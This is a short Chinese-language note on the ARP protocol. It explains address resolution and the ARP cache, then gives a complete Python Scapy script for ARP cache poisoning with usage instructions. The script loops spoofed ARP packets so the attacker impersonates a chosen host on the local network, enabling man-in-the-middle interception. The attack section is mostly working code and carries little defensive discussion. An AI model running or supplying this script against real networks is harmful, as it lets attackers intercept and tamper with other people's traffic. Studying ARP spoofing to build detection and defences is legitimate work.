# 1. ARP

## 1.1 ARP协议
(Address Resolution Protocol) 地址解析协议, 是介于2层和3层的一中协议.

机器A向机器B发送消息:

A以广播形式询问所有机器(xx.xx.xx.0/24)B机器IP对应的MAC地址, 当B收到请求后, 会回复自己的MAC地址给A. 这种发送消息的方式为ARP请求/ARP广播

A将数据帧发送给网关, 由网关转发给B



## 1.2 ARP表
为了避免每次要向机器发送信息时都必须发送 ARP 广播, 用ARP表来缓存ip信息

查询命令:

```python
windows: arp -a
linux: arp -an
```

# 2. ARP攻击

利用Python的Scapy模块

```python
#!/usr/bin/python3

# Python script for ARP Cache Poisoning
import sys

from scapy.all import *

def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

Timeout = 2

if len(sys.argv) != 3:
    print("Usage: arp_attack.py HOST_TO_ATTACK HOST_TO_IMPERSONATE")
    sys.exit(1)

my_mac = get_mac_address()
if not my_mac:
    print("Can not get local MAC address, quitting")
    sys.exit(1)

packet = Ether()/ARP(op="who-has", hwsrc=my_mac, psrc=sys.argv[2], pdst=sys.argv[1])

sendp(packet, loop=1, inter=0.2)
```

 执行:

```
python arp_attakc.py 攻击IP 设置IP
```
